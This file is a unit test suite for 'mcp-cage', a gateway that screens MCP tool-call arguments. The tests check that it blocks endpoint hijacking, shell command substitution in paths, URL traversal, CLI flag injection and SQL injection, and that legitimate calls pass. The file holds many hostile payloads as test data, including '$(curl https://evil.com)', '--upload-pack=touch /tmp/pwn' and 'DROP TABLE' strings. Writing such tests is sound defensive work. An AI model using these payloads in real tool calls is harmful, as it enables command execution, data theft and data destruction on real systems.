"""
Empirical Guard Regression & Latency Test Suite for `mcp-cage` (`tests/unit/test_empirical_guards.py`).

Tests all 5 real-world vulnerability classes uncovered across audited public and enterprise MCP servers,
verified end-to-end through `MCPCageEngine` (`MCPWireGateway`) with zero manual configuration:
  1. Runtime Endpoint & Session Re-pointing (`endpoint_repoint_guard` — `GHSA-rvjm-7hvp-f868` in `datalayer/jupyter-mcp-server`)
  2. Embedded POSIX Command Substitution in File/Folder Paths (Cloud Container Deployment MCP Servers (`CWE-78`))
  3. REST URL Path-Segment Traversal (`url_path_segment_guard` — Edge & API Gateway MCP Servers (`CWE-22` REST path-segment traversal))
  4. CLI Positional-Argument Flag Injection (`cli_flag_injection_guard` — Kubernetes & Infrastructure CLI MCP Servers (`CWE-88` positional flag injection))
  5. Multi-Statement & Clause-Level SQL AST Guard (`sql_safety_guard` — Enterprise Data Warehouse & Relational SQL MCP Servers (`CWE-89` comment-split & clause injection))
  6. Sub-millisecond (< 1.0 ms) deterministic guard latency verification.
"""

from __future__ import annotations

import sys
import tempfile
import time
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))

from mcp_cage import (
    BidirectionalSecretScrubber,
    MCPCageEngine,
    SchemaLockVerifier,
    SessionTaintStateMachine,
    StandardArgGuards,
    __version__,
    cli_flag_injection_guard,
    endpoint_repoint_guard,
    is_safe_workspace_path,
    make_endpoint_repoint_guard,
    make_workspace_path_guard,
    sql_safety_guard,
    url_path_segment_guard,
)


def _call_tool(engine: MCPCageEngine, req_id: int, tool_name: str, arguments: dict) -> tuple[dict | None, dict | None]:
    return engine.process_client_to_server(
        {
            "jsonrpc": "2.0",
            "id": req_id,
            "method": "tools/call",
            "params": {"name": tool_name, "arguments": arguments},
        }
    )


def _assert_blocked(testcase: unittest.TestCase, fwd: dict | None, imm: dict | None, expected_substr: str = "") -> str:
    testcase.assertIsNone(fwd, "Malicious call should not be forwarded to upstream server")
    testcase.assertIsNotNone(imm, "Blocked call must return immediate JSON-RPC soft error")
    assert imm is not None
    result = imm.get("result", {})
    testcase.assertTrue(result.get("isError"), f"Expected isError=True, got {imm}")
    text = result["content"][0]["text"]
    if expected_substr:
        testcase.assertIn(expected_substr, text)
    return text


class TestMCPCageV30EmpiricalGuards(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp_dir = tempfile.TemporaryDirectory()
        self.tmp_path = Path(self.tmp_dir.name).resolve()
        self.workspace = self.tmp_path / "workspace"
        self.workspace.mkdir(parents=True, exist_ok=True)
        (self.workspace / "services" / "api").mkdir(parents=True, exist_ok=True)
        (self.workspace / "services" / "api" / "main.py").write_text("print('ok')\n")
        self.db_path = self.tmp_path / "taint.db"
        self.lock_path = self.tmp_path / "mcp-lock.json"

    def tearDown(self) -> None:
        self.tmp_dir.cleanup()

    def _new_engine(
        self,
        server_name: str = "empirical-test",
        *,
        allow_endpoint_repoint: bool = False,
        trusted_endpoints: set[str] | None = None,
    ) -> MCPCageEngine:
        return MCPCageEngine(
            server_name=server_name,
            state_machine=SessionTaintStateMachine(self.db_path, session_id=f"s-{server_name}"),
            scrubber=BidirectionalSecretScrubber(db_path=self.db_path),
            verifier=SchemaLockVerifier(self.lock_path),
            workspace_root=self.workspace,
            allow_endpoint_repoint=allow_endpoint_repoint,
            trusted_endpoints=trusted_endpoints,
        )

    def test_version_is_current(self) -> None:
        self.assertIn(__version__, ("0.3.0", "0.4.0", "0.4.1", "0.4.2"))

    # -------------------------------------------------------------------------
    # 1. Runtime Endpoint & Session Re-pointing (`GHSA-rvjm-7hvp-f868`)
    # -------------------------------------------------------------------------
    def test_01_endpoint_repoint_guard_jupyter_hijack_and_opt_in(self) -> None:
        engine = self._new_engine("jupyter")

        # Default zero-config blocks runtime connection-mutation tools outright
        for tool_name, args in (
            ("connect_to_jupyter", {"jupyter_url": "https://jupyter.corp.internal", "jupyter_token": "raw-tok"}),
            ("connect_to_server", {"server_url": "http://127.0.0.1:8888"}),
            ("switch_server", {"endpoint": "http://169.254.169.254/latest/meta-data/"}),
            ("set_endpoint", {"base_url": "http://localhost:8888"}),
            ("configure_connection", {"provider": "local", "runtime_url": "http://10.0.0.5:8888"}),
        ):
            fwd, imm = _call_tool(engine, 1, tool_name, args)
            _assert_blocked(self, fwd, imm, "GHSA-rvjm-7hvp-f868")

        # Even on an arbitrarily named tool, passing `*_url` + `*_token`/`*_key` mid-session is blocked
        fwd_pair, imm_pair = _call_tool(
            engine,
            2,
            "sync_notebook_context",
            {"document_url": "https://evil.attacker.com/nb", "document_token": "tok_live_secret_123"},
        )
        _assert_blocked(self, fwd_pair, imm_pair, "GHSA-rvjm-7hvp-f868")

        # Direct helper check
        ok_direct, _ = endpoint_repoint_guard({"api_url": "http://127.0.0.1:8080", "api_key": "secret-key"})
        self.assertFalse(ok_direct)

        # Explicit capability opt-in with trusted host still blocks local/private/untrusted/raw tokens
        opted_engine = self._new_engine(
            "jupyter-opted",
            allow_endpoint_repoint=True,
            trusted_endpoints={"jupyter.corp.internal"},
        )
        for bad_args in (
            {"provider": "local"},
            {"jupyter_url": "http://127.0.0.1:8888"},
            {"jupyter_url": "http://localhost:8888"},
            {"jupyter_url": "http://169.254.169.254/latest/meta-data/"},
            {"jupyter_url": "http://192.168.1.10:8888"},
            {"jupyter_url": "https://evil.attacker.com"},
            {"jupyter_url": "https://jupyter.corp.internal", "jupyter_token": "raw-bearer-token-abc"},
        ):
            fwd_b, imm_b = _call_tool(opted_engine, 3, "connect_to_jupyter", bad_args)
            _assert_blocked(self, fwd_b, imm_b, "GHSA-rvjm-7hvp-f868")

        # Trusted endpoint with NO raw bearer token in LLM context succeeds when opted in
        fwd_ok, imm_ok = _call_tool(
            opted_engine,
            4,
            "connect_to_jupyter",
            {"jupyter_url": "https://jupyter.corp.internal/lab"},
        )
        self.assertIsNotNone(fwd_ok)
        self.assertIsNone(imm_ok)

        # Standalone make_endpoint_repoint_guard check
        g = make_endpoint_repoint_guard(tool_name="connect_to_jupyter", allow_repoint=True, trusted_hosts={"jupyter.corp.internal"})
        self.assertTrue(g({"jupyter_url": "https://jupyter.corp.internal/lab"})[0])
        self.assertFalse(g({"jupyter_url": "https://jupyter.corp.internal/lab", "authorization": "Bearer eyJ123"})[0])

    # -------------------------------------------------------------------------
    # 2. Embedded POSIX Command Substitution in File/Folder Paths (CWE-78)
    # -------------------------------------------------------------------------
    def test_02_path_command_substitution_and_workspace_confinement(self) -> None:
        engine = self._new_engine("cloud-container-mcp")

        # Disguised command substitution inside valid relative workspace path segments
        payloads = [
            ("deploy_local_folder", {"folderPath": "services/app$(touch /tmp/pwn)"}),
            ("deploy_local_folder", {"source_dir": "services/app`id`"}),
            ("process_source", {"app_dir": "./services/${IFS}evil"}),
            ("run_build", {"working_directory": "services/api$(curl https://evil.com)"}),
            ("cluster_toolkit_download", {"download_directory": "dl`whoami`"}),
            ("move_artifact", {"destination": "out/app$(id)"}),
            ("write_file", {"filePath": "services/api/main$(id).py", "content": "print(1)"}),
        ]
        for idx, (tool_name, args) in enumerate(payloads, start=10):
            fwd, imm = _call_tool(engine, idx, tool_name, args)
            _assert_blocked(self, fwd, imm, "CWE-78")

        # Direct unit checks on `is_safe_workspace_path` & `make_workspace_path_guard`
        ok_raw, reason_raw = is_safe_workspace_path("services/app$(id)", self.workspace, is_write=True)
        self.assertFalse(ok_raw)
        self.assertIn("CWE-78", reason_raw)

        ws_guard = make_workspace_path_guard(self.workspace, is_write=True)
        for key in ("folderPath", "filePath", "source_dir", "app_dir", "working_directory", "download_directory", "destination"):
            ok_k, _ = ws_guard({key: f"valid/app$(id)"})
            self.assertFalse(ok_k, f"make_workspace_path_guard missed POSIX substitution in {key}")
            ok_valid, _ = ws_guard({key: "services/api"})
            self.assertTrue(ok_valid, f"make_workspace_path_guard false-positived on valid {key}")

        # Multiple path keys: second key malicious must still be blocked
        self.assertFalse(ws_guard({"source_dir": "services/api", "destination": "services/evil`id`"})[0])

        # Legitimate container deployment inside workspace succeeds
        fwd_ok, imm_ok = _call_tool(engine, 20, "deploy_local_folder", {"folderPath": "services/api", "service": "api-svc"})
        self.assertIsNotNone(fwd_ok)
        self.assertIsNone(imm_ok)

    # -------------------------------------------------------------------------
    # 3. REST URL Path-Segment Traversal Guard (CWE-22)
    # -------------------------------------------------------------------------
    def test_03_url_path_segment_traversal_guard(self) -> None:
        engine = self._new_engine("edge-gateway-mcp")

        attacks = [
            ("edge_get_worker", {"scriptName": "../../../../user"}),
            ("edge_get_worker", {"scriptName": "worker%2f..%2fadmin"}),
            ("kb_search", {"rag_id": "docs%2e%2e/secrets"}),
            ("get_job", {"job_id": "123?admin=true"}),
            ("get_session", {"session_id": "sess#fragment"}),
            ("get_device", {"deviceId": "dev\\..\\other"}),
            ("get_command", {"commandId": "%252e%252e%252fadmin"}),
            ("get_bucket_object", {"bucket": "prod/../../admin"}),
            ("get_repo_info", {"repo": "org/../../admin"}),
            ("custom_api_call", {"workspace_id": "ws_1/../../other", "nested": {"tenantName": "t?x=1"}}),
        ]
        for idx, (tool_name, args) in enumerate(attacks, start=30):
            fwd, imm = _call_tool(engine, idx, tool_name, args)
            _assert_blocked(self, fwd, imm, "CWE-22")

        # Direct unit tests
        self.assertFalse(url_path_segment_guard({"scriptName": "../../../../user"})[0])
        self.assertTrue(url_path_segment_guard({"scriptName": "edge-auth-worker-v2", "account_id": "acc_9912"})[0])

        # Legitimate REST call succeeds
        fwd_ok, imm_ok = _call_tool(
            engine,
            45,
            "edge_get_worker",
            {"scriptName": "edge-auth-worker-v2", "account_id": "acc_9912"},
        )
        self.assertIsNotNone(fwd_ok)
        self.assertIsNone(imm_ok)

    # -------------------------------------------------------------------------
    # 4. CLI Positional-Argument Flag Injection Guard (CWE-88)
    # -------------------------------------------------------------------------
    def test_04_cli_flag_injection_guard(self) -> None:
        engine = self._new_engine("k8s-cli-mcp")

        attacks = [
            ("git_clone", {"repo": "--upload-pack=touch /tmp/pwn", "destination": "repo-dir"}),
            ("kubectl_get", {"pod": "--kubeconfig=/tmp/evil.yaml", "namespace": "default"}),
            ("kubectl_describe", {"node": "worker-1 --kubeconfig=/tmp/evil.yaml"}),
            ("cluster_get_info", {"cluster": "--token=exfil", "project": "prod-proj", "region": "us-central1"}),
            ("kubectl_logs", {"pod": "api-0", "namespace": "--template={{.metadata}}"}),
            ("cluster_toolkit_download", {"destination": "--output=/etc/cron.d/pwn"}),
            ("kubectl_exec", {"resource_name": "-oProxyCommand=sh"}),
        ]
        for idx, (tool_name, args) in enumerate(attacks, start=50):
            fwd, imm = _call_tool(engine, idx, tool_name, args)
            _assert_blocked(self, fwd, imm, "CWE-88")

        # Direct unit checks
        self.assertFalse(cli_flag_injection_guard({"pod": " --kubeconfig=/tmp/evil"})[0])
        self.assertTrue(cli_flag_injection_guard({"pod": "web-api-7f9b", "namespace": "production", "region": "us-central1"})[0])

        # Legitimate K8s CLI call succeeds
        fwd_ok, imm_ok = _call_tool(
            engine,
            60,
            "kubectl_get",
            {"pod": "web-api-7f9b", "namespace": "production"},
        )
        self.assertIsNotNone(fwd_ok)
        self.assertIsNone(imm_ok)

    # -------------------------------------------------------------------------
    # 5. Multi-Statement & Clause-Level SQL AST Guard (CWE-89)
    # -------------------------------------------------------------------------
    def test_05_sql_safety_guard_warehouse_and_relational(self) -> None:
        engine = self._new_engine("warehouse-sql-mcp")

        attacks = [
            ("run_warehouse_query", {"statement": "-- SELECT 1\nDROP TABLE prod_customers"}),
            ("run_warehouse_query", {"statement": "SELECT 1; SELECT * FROM account_usage.users"}),
            ("mysql_query", {"sql": "SELECT /* safe */ 1; DELETE FROM users"}),
            ("mysql_query", {"sql": "DR/**/OP TABLE billing"}),
            ("mysql_query", {"sql": "SELECT 1 /* unclosed comment"}),
            ("mysql_query", {"sql": "SELECT * FROM users", "where_clause": "1=1 UNION SELECT user, password FROM mysql.user"}),
            ("mysql_query", {"sql": "SELECT * FROM users", "order_by": "id; DROP TABLE users"}),
            ("mysql_query", {"sql": "SELECT * FROM users", "order_by": "id DESC -- hijack"}),
            ("read_records", {"table": "users", "filter": "active = 1 OR 1=1"}),
            ("read_records", {"table": "users", "filter": "id = 1; SELECT SLEEP(5)"}),
            ("query_semantic_view", {"query": "SELECT 1; CALL SYSTEM$SEND_EMAIL()"}),
        ]
        for idx, (tool_name, args) in enumerate(attacks, start=70):
            fwd, imm = _call_tool(engine, idx, tool_name, args)
            _assert_blocked(self, fwd, imm, "A4.3")

        # Direct unit checks & zero false positives (including subquery in where_clause)
        self.assertTrue(sql_safety_guard({"sql": "SELECT id, name FROM users WHERE msg = 'a;b';"})[0])
        self.assertTrue(sql_safety_guard({"sql": "SELECT id FROM users", "where_clause": "status = 'active'", "order_by": "created_at DESC"})[0])
        self.assertTrue(sql_safety_guard({"sql": "SELECT id FROM users", "where_clause": "user_id IN (SELECT user_id FROM active_users)"})[0])

        # Non-SQL search tool with natural language `query` must NOT false-positive
        fwd_search, imm_search = _call_tool(
            engine,
            85,
            "web_search",
            {"query": "how to drop table in postgres safely"},
        )
        self.assertIsNotNone(fwd_search)
        self.assertIsNone(imm_search)

        # Legitimate warehouse SQL query succeeds
        fwd_sql, imm_sql = _call_tool(
            engine,
            86,
            "run_warehouse_query",
            {"statement": "SELECT account_id, plan FROM analytics.subscriptions WHERE active = TRUE"},
        )
        self.assertIsNotNone(fwd_sql)
        self.assertIsNone(imm_sql)

    # -------------------------------------------------------------------------
    # 6. Sub-Millisecond Wire Latency Benchmark
    # -------------------------------------------------------------------------
    def test_06_sub_millisecond_wire_guard_latency(self) -> None:
        engine = self._new_engine("perf-bench")
        samples = [
            ("deploy_local_folder", {"folderPath": "services/api"}),
            ("edge_get_worker", {"scriptName": "edge-worker-01", "account_id": "acc_123"}),
            ("kubectl_get", {"pod": "api-pod-1", "namespace": "prod"}),
            ("run_warehouse_query", {"statement": "SELECT id FROM events WHERE status = 'ok'"}),
            ("connect_to_jupyter", {"jupyter_url": "http://127.0.0.1:8888"}),
        ]
        iterations = 1000
        start = time.perf_counter()
        for i in range(iterations):
            t_name, t_args = samples[i % len(samples)]
            _call_tool(engine, i + 1000, t_name, t_args)
        elapsed_ms = (time.perf_counter() - start) * 1000.0
        mean_ms = elapsed_ms / iterations
        self.assertLess(mean_ms, 1.0, f"Expected sub-millisecond mean latency, got {mean_ms:.3f} ms")


from tests.unit.test_wiredifc_canonicalizer_and_sandbox import TestMCPCageV40WireDIFC  # noqa: F401, E402

if __name__ == "__main__":
    unittest.main(verbosity=2)
